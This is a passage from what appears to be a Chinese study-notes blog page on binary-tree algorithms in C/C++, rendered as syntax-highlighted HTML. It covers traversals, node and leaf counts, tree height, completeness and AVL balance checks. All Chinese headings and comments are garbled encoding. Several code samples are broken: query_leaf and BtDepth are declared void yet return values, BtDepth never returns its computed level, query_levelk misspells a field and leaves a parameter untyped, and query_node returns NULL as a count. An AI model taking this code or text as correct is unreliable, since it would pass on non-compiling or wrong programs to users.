class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    S<span class="token punctuation">.</span><span class="token function">Pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>S<span class="token punctuation">.</span><span class="token function">emptys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    S<span class="token punctuation">.</span><span class="token function">Push_back</span><span class="token punctuation">(</span>S<span class="token punctuation">.</span><span class="token function">Gettop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>rson<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * [PostOrder ååºéå†äºŒå‰æ ‘éé€’å½’] * @param T [Bitree] */</span><span class="token keyword">void</span> <span class="token function">PostOrder</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">InitStack</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">;</span>BiTree p <span class="token operator">=</span> T<span class="token punctuation">;</span>BiTree r <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>p <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">IsEmpty</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token comment">// èµ°åˆ°æœ€å·¦è¾¹</span><span class="token punctuation">&#123;</span> <span class="token function">Push</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>lchild<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">GetTop</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>rchild <span class="token operator">&amp;&amp;</span> p<span class="token operator">-></span>rchild <span class="token operator">!=</span> r<span class="token punctuation">)</span> <span class="token comment">// å³å­æ ‘å­˜åœ¨ä¸”æœªè¢«è®¿é—®</span><span class="token punctuation">&#123;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>rchild<span class="token punctuation">;</span> <span class="token comment">// è½¬å‘å³</span><span class="token function">Push</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å…¥æ ˆ</span>p <span class="token operator">=</span> p<span class="token operator">-></span>lchild<span class="token punctuation">;</span> <span class="token comment">// è½¬å‘å·¦</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">Pop</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">visit</span><span class="token punctuation">(</span>p<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>r<span class="token operator">=</span> p <span class="token punctuation">;</span>p <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="6-å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘è¿›è¡Œå±‚æ¬¡éå†ç®—æ³•ã€‚">6) å†™å‡ºå¯¹ç”¨äºŒå‰é“¾è¡¨å­˜å‚¨çš„äºŒå‰æ ‘è¿›è¡Œå±‚æ¬¡éå†ç®—æ³•ã€‚</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200826212154217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200826212154217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * [Invertlevel å±‚æ¬¡éå†,è‡ªä¸‹è€Œä¸Š,è‡ªå·¦åˆ°å³] * @param T [BiTree] * äºŒå‰æ ‘è‡ªä¸‹è€Œä¸Š,è‡ªå·¦åˆ°å³ * æ­£å¸¸å±‚æ¬¡éå†, å‡ºé˜Ÿæ—¶å…¥æ ˆ * æœ€åä¾æ¬¡å‡ºæ ˆä¸ºç»“æœ */</span><span class="token keyword">void</span> <span class="token function">Invertlevel</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Stack<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> S<span class="token punctuation">;</span>Queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> Q<span class="token punctuation">;</span>BiTree p<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">InitQueue</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">InitStack</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">EnQueue</span><span class="token punctuation">(</span>Q<span class="token punctuation">,</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">IsEmpty</span><span class="token punctuation">(</span>Q<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">DeQueue</span><span class="token punctuation">(</span>Q<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Push</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//  å‡ºé˜Ÿ,å…¥æ ˆ</span><span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token function">EnQueue</span><span class="token punctuation">(</span>Q<span class="token punctuation">,</span>p<span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>rchild<span class="token punctuation">)</span><span class="token function">EnQueue</span><span class="token punctuation">(</span>Q<span class="token punctuation">,</span>p<span class="token operator">-></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">IsEmpty</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">Pop</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">visit</span><span class="token punctuation">(</span>p<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è‡ªä¸‹è€Œä¸Š,è‡ªå·¦åˆ°å³</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre>              </div>            </details></div><h2 id="7-é€’å½’å®ç°æ±‚äºŒå‰æ ‘çš„æ‰€æœ‰å¶å­æ•°ã€‚">7) é€’å½’å®ç°æ±‚äºŒå‰æ ‘çš„æ‰€æœ‰å¶å­æ•°ã€‚</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200826212139288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200826212139288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * æ±‚äºŒå‰æ ‘çš„æ‰€æœ‰å¶å­æ•°] * @param T [description] */</span><span class="token keyword">void</span> <span class="token function">query_leaf</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>T<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lson <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> T<span class="token operator">-></span>rson <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">query_leaf</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lson<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">query_leaf</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rson<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="8-é€’å½’å®ç°æ±‚äºŒå‰æ ‘çš„æ‰€æœ‰ç»“ç‚¹æ€»æ•°ã€‚">8) é€’å½’å®ç°æ±‚äºŒå‰æ ‘çš„æ‰€æœ‰ç»“ç‚¹æ€»æ•°ã€‚</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200826212126863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200826212126863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token keyword">int</span> <span class="token function">query_node</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span><span class="token comment">// èŠ‚ç‚¹æ€»ä¸ªæ•° </span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>T<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lson <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> T<span class="token operator">-></span>rson <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">query_node</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lson<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">query_node</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rson<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></div><h2 id="8-æ±‚äºŒå‰æ ‘ç¬¬kå±‚çš„ç»“ç‚¹ä¸ªæ•°">8+) æ±‚äºŒå‰æ ‘ç¬¬kå±‚çš„ç»“ç‚¹ä¸ªæ•°</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200826212110361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200826212110361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * æ±‚äºŒå‰æ ‘ç¬¬ k å±‚çš„ç»“ç‚¹ä¸ªæ•° * æ€æƒ³: å¦‚å›¾ * @param  T [description] * @param  k [ç¬¬kå±‚] * @return   [description] */</span><span class="token keyword">int</span> <span class="token function">query_levelk</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>T<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">query_levelk</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lson<span class="token punctuation">,</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">query_levelk</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rsom<span class="token punctuation">,</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="9-åˆ¤æ–­å®Œå…¨äºŒå‰æ ‘">9) åˆ¤æ–­å®Œå…¨äºŒå‰æ ‘</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200826212024741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200826212024741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * åˆ¤æ–­å®Œå…¨äºŒå‰æ ‘  * @param  T [description] * @return   [description] */</span>bool <span class="token function">judge</span><span class="token punctuation">(</span>Bitree <span class="token operator">&amp;</span>T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//1 2 4 8 -1 -1 9 -1 -1 5 10 -1 -1 -1 3 6 -1 -1 7 -1 -1</span>    queue<span class="token operator">&lt;</span>Bitree<span class="token operator">></span>Q<span class="token punctuation">;</span>    Bitree pre<span class="token punctuation">;</span>    Q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>Q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        pre <span class="token operator">=</span> Q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>pre<span class="token operator">-></span>lson<span class="token punctuation">)</span><span class="token punctuation">;</span>        Q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>pre<span class="token operator">-></span>rson<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>Q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        pre <span class="token operator">=</span> Q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">!=</span> pre<span class="token punctuation">)</span>            <span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="10-é€’å½’å®ç°æ±‚-äºŒå‰æ ‘é«˜åº¦-æ·±åº¦">10) é€’å½’å®ç°æ±‚ äºŒå‰æ ‘é«˜åº¦(æ·±åº¦)</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200826212011620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200826212011620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * äºŒå‰æ ‘é«˜åº¦  * @param  T [description] * @return   [description] */</span><span class="token keyword">int</span> <span class="token function">deep_tree</span><span class="token punctuation">(</span>Bitree <span class="token operator">&amp;</span>T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>T<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token function">deep_tree</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lson<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> rig <span class="token operator">=</span> <span class="token function">deep_tree</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rson<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> left <span class="token operator">></span> rig  <span class="token operator">?</span> <span class="token punctuation">(</span>left<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token punctuation">(</span>rig<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="11-éé€’å½’æ±‚äºŒå‰æ ‘é«˜åº¦-æ·±åº¦-åˆ©ç”¨å±‚æ¬¡éå†">11) éé€’å½’æ±‚äºŒå‰æ ‘é«˜åº¦(æ·±åº¦)(åˆ©ç”¨å±‚æ¬¡éå†)</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200826211951688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200826211951688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * [BtDepth éé€’å½’æ±‚äºŒå‰æ ‘é«˜åº¦] * @param T [BiTree] *  æ•°ç»„æ¨¡æ‹Ÿé˜Ÿåˆ—,level è®°å½•å±‚æ•°, *  æ¯æ¬¡å±‚æ¬¡éå†å‡ºé˜Ÿåˆ—æ—¶,ä¸lastæŒ‡é’ˆæ¯”è¾ƒ,è‹¥ä¸¤è€…ç›¸åŒ,åˆ™å±‚æ•°+1; */</span><span class="token keyword">void</span> <span class="token function">BtDepth</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>T<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> front <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">,</span> rear <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> last <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> level <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>BiTree Q<span class="token punctuation">[</span>MAXN<span class="token punctuation">]</span><span class="token punctuation">;</span>Q<span class="token punctuation">[</span><span class="token operator">++</span>rear<span class="token punctuation">]</span> <span class="token operator">=</span> T<span class="token punctuation">;</span>BiTree p<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>front <span class="token operator">&lt;=</span> rear<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    p <span class="token operator">=</span> Q<span class="token punctuation">[</span><span class="token operator">++</span>front<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>lchild<span class="token punctuation">)</span>    Q<span class="token punctuation">[</span><span class="token operator">++</span>rear<span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token operator">-></span>lchild<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>rchild<span class="token punctuation">)</span>    Q<span class="token punctuation">[</span><span class="token operator">++</span>rear<span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token operator">-></span>rchild<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>front <span class="token operator">==</span> last<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// è¯¥å±‚æœ€å³ç»“ç‚¹</span>    level<span class="token operator">++</span><span class="token punctuation">;</span>    last <span class="token operator">=</span> rear<span class="token punctuation">;</span>  <span class="token comment">//  æ›´æ–°</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="11-å­©å­å…„å¼Ÿè¡¨ç¤ºæ³•æ±‚æ ‘çš„æ·±åº¦">11+) å­©å­å…„å¼Ÿè¡¨ç¤ºæ³•æ±‚æ ‘çš„æ·±åº¦</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * [Height_CS å­©å­å…„å¼Ÿè¡¨ç¤ºæ³•æ±‚æ ‘çš„æ·±åº¦] * @param  T [description] * @return   [description] */</span><span class="token keyword">int</span> <span class="token function">Height_CS</span><span class="token punctuation">(</span>CSTree T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> hc<span class="token punctuation">,</span>hs<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>T <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>hc <span class="token operator">=</span> <span class="token function">Height_CS</span><span class="token punctuation">(</span>T<span class="token operator">-></span>fichild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ç¬¬ä¸€å­æ ‘é«˜</span>hs <span class="token operator">=</span> <span class="token function">Height_CS</span><span class="token punctuation">(</span>T<span class="token operator">-></span>nextchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å…„å¼Ÿæ ‘é«˜</span><span class="token keyword">return</span> hc<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">></span> hs <span class="token operator">?</span> hc<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">:</span> hs<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="12-åˆ¤æ–­å¹³è¡¡äºŒå‰æ•°æ˜¯å¦å¹³è¡¡">12) åˆ¤æ–­å¹³è¡¡äºŒå‰æ•°æ˜¯å¦å¹³è¡¡</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">/** * [judge_AVL åˆ¤æ–­äºŒå‰æ’åºæ ‘,æ˜¯å¦å¹³è¡¡] * @param T       [description] * @param balance [description] * @param h       [description] * balanc = 1 å¹³è¡¡, 0 ä¸å¹³è¡¡ *  ç©ºæ ‘ , ä»…æœ‰æ ¹èŠ‚ç‚¹,  å¹³è¡¡ */</span><span class="token keyword">void</span> <span class="token function">judge_AVL</span><span class="token punctuation">(</span>BiTree T<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">&amp;</span>balance <span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">&amp;</span>h<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> bl <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> br <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> hl <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> hr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>T <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment">// ç©ºæ ‘ ,é«˜åº¦ä¸º 0 </span><span class="token punctuation">&#123;</span>h <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> balance <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lchild <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span>  T<span class="token operator">-></span>rchild <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment">// ä»…æœ‰æ ¹èŠ‚ç‚¹,  é«˜åº¦ä¸º1 </span><span class="token punctuation">&#123;</span>h <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> balance <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">judge_AVL</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lchild<span class="token 